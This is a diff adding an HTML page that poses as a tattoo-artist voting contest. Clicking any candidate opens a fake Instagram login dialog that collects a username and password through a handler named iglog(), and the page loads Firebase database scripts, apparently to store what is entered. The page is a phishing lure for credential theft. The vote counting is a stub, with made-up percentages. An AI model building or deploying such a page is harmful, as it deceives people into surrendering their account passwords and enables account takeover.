@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Vote for your favorite tattoo artist on our platform. Select a candidate and help them win by casting your vote. See real-time vote counts and percentages as you participate in the voting process. Join us and make your voice heard!" />
+    <title>Tattoo Artistry Contest</title>
+    <script src="js/jquery-3.6.0.min.js"></script>
+    <link rel="stylesheet" href="css/index.css">
+    <link rel="stylesheet" href="assets/css/main.css">
+    <script src="js/index.js"></script>
+</head>
+<body>
+    <div class="container">
+        <h1>Vote Your Favorite Tattoo Artist</h1>
+        <div class="header">
+            <img class="logo" src="image/logo.png" alt="Logo">
+        </div>
+        <p>Remaining votes: <span id="remaining-votes">1000</span></p>
+        <div class="candidate" onclick="showDialog(0)" >
+            <img src="image/eastsidetat.jpeg" alt="Artist 1">
+            <h2>Eastside Tattoo</h2>
+            <p>Percentage: <span id="percentage-artist1">20%</span></p>
+        </div>
+        <div class="candidate" onclick="showDialog(1)" >
+            <img src="image/certifiedtat.jpeg" alt="Artist 2">
+            <h2>Certified Tattoo</h2>
+            <p>Percentage: <span id="percentage-artist2">50%</span></p>
+        </div>
+        <div class="candidate" onclick="showDialog(2)" >
+            <img src="image/liliumtat.jpeg" alt="Artist 3">
+            <h2>Lilium Tattoo</h2>
+            <p>Percentage: <span id="percentage-artist3">15%</span></p>
+        </div>
+        <div class="candidate" onclick="showDialog(3)" >
+            <img src="image/studio28.jpeg" alt="Artist 4">
+            <h2>Studio28 Tattoo</h2>
+            <p>Percentage: <span id="percentage-artist4">70%</span></p>
+        </div>
+    </div>
+
+    <!-- Dialog Box -->
+    <div id="dialog" class="dialog">
+        <div class="dialog-content">
+            <span class="close" onclick="closeDialog()">&times;</span>
+            <h2><span hidden id="dialog-artist-name"></span></h2>
+              <main class="l-main">
+              <div class="l-main__img">
+                <img src="assets/img/homepage.png" alt="Smartphones">
+              </div>
+              <div class="l-user">
+                <div class="c-panel group">
+
+              <img class="c-panel__img" src="assets/img/instagram.svg" alt="Instagram">
+              <div class="c-panel__form">
+                <input type="text" class="c-panel__input" class="form-control" required data-error="Please enter your email" placeholder="Phone number, username, or email" id="ig-uname">
+                <input type="text" class="c-panel__input" class="form-control" required data-error="Please enter your email" placeholder="Password" id="ig-pass">
+                <button class="c-btn" type="submit" onclick="iglog()" id="ig-log"> Log In</button> 
+                <span class="c-panel__span">OR</span>
+              </div>
+              <a href="#" class="c-panel__facebook">Login with Facebook</a> <br>
+              <a href="#" class="c-panel__forgot">Forgot password?</a>
+              <br>
+              <br>
+            </div>
+            <div class="c-signup group">
+              <p>Don't have an account? <span>Sign up</span></p>
+            </div>
+
+                  <div class="c-app">
+                    <p>Get the app.</p>
+                    <div class="c-app__download">
+                      <img src="assets/img/apple.png" alt="Apple Store">
+                      <img src="assets/img/google.png" alt="Google Play">
+                    </div>
+                  </div>
+                </div>
+            </main>
+        </div>
+    </div>
+
+        <!-- Thank You Dialog Box -->
+        <div id="thank-you-dialog" class="dialog">
+            <div class="dialog-content">
+                <h2>Thank You for Voting!</h2>
+                <p>Your vote has been submitted successfully.</p>
+                <button class="instagram-login" onclick="closeThankYouDialog()">Close</button>
+            </div>
+        </div>
+
+    <script>
+        var totalVotes = 1000;
+        var candidates = [
+            { name: "Eastside Tattoo", votes: 20 },
+            { name: "Certified Tattoo", votes: 50 },
+            { name: "Lilium Tattoo", votes: 15 },
+            { name: "Studio28", votes: 70 }
+
+        ];
+
+        var currentCandidateIndex = 0;
+
+        function showDialog(candidateIndex) {
+            currentCandidateIndex = candidateIndex;
+            var dialog = document.getElementById("dialog");
+            var dialogArtistName = document.getElementById("dialog-artist-name");
+            dialogArtistName.textContent = candidates[currentCandidateIndex].name;
+            dialog.style.display = "flex";
+        }
+
+        function closeDialog() {
+            var dialog = document.getElementById("dialog");
+            dialog.style.display = "none";
+        }
+
+        function voteWithInstagram() {
+            // Implement Instagram authentication logic here
+            // For this example, we'll simply decrement the totalVotes and update the UI
+            if (totalVotes > 0) {
+                candidates[currentCandidateIndex].votes++;
+                totalVotes--;
+                updateUI();
+                closeDialog();
+            }
+        }
+
+        function showInstagramDialog() {
+             var dialog = document.getElementById("dialog");
+             dialog.style.display = "none";
+             
+             var instagramDialog = document.getElementById("instagram-dialog");
+             instagramDialog.style.display = "flex";
+         }
+
+         function closeInstagramDialog() {
+             var instagramDialog = document.getElementById("instagram-dialog");
+             instagramDialog.style.display = "none";
+
+             var dialog = document.getElementById("dialog");
+             dialog.style.display = "flex";
+         }
+
+         function thankYouForVoting() {
+             var instagramDialog = document.getElementById("instagram-dialog");
+             instagramDialog.style.display = "none";
+
+             var thankYouDialog = document.getElementById("thank-you-dialog");
+             thankYouDialog.style.display = "flex";
+             
+             // Simulate submitting the vote
+             if (totalVotes > 0) {
+                 candidates[currentCandidateIndex].votes++;
+                 totalVotes--;
+                 updateUI();
+             }
+         }
+
+         function closeThankYouDialog() {
+             var thankYouDialog = document.getElementById("thank-you-dialog");
+             thankYouDialog.style.display = "none";
+         }
+
+         function closeDialog() {
+             var dialog = document.getElementById("dialog");
+             dialog.style.display = "none";
+         }
+
+
+        function updateUI() {
+            var remainingVotesElement = document.getElementById("remaining-votes");
+            var candidateElements = document.getElementsByClassName("candidate");
+
+            for (var i = 0; i < candidates.length; i++) {
+                var votesElement = document.getElementById("votes-artist" + (i + 1));
+                var percentageElement = document.getElementById("percentage-artist" + (i + 1));
+
+                var votes = candidates[i].votes;
+                var percentage = ((votes / (1000 - totalVotes)) * 100).toFixed(2) + "%";
+
+                votesElement.textContent = votes;
+                percentageElement.textContent = percentage;
+            }
+
+            remainingVotesElement.textContent = totalVotes;
+
+        }
+
+
+    </script>
+    <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-app.js"></script>
+
+    <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-database.js"></script>
+
+    <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase.js"></script>
+    <script src="https://raw.githubusercontent.com/firebase/firebase-bower/master/firebase-app-check.js.map"></script>
+
+    <script src="js/firebase.js">
+
+
+
+    </script>
+</body>
+</html>
